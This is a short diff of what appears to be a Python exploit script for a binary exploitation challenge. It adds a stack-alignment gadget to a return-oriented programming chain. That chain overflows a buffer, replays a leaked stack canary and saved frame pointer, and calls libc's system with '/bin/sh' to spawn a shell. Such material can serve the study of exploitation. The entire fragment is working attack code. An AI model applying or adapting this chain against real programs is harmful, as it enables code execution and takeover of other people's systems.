@@ -89,6 +89,7 @@ def main():
     payload2 = b"A" * 72
     payload2 += p64(canary)
     payload2 += p64(saved_rbp)
+    payload2 += p64(ret)      # Stack alignment
     payload2 += p64(pop_rdi)
     payload2 += p64(libc_base + LIBC_OFFSET_BINSH)
     payload2 += p64(libc_base + LIBC_OFFSET_SYSTEM)
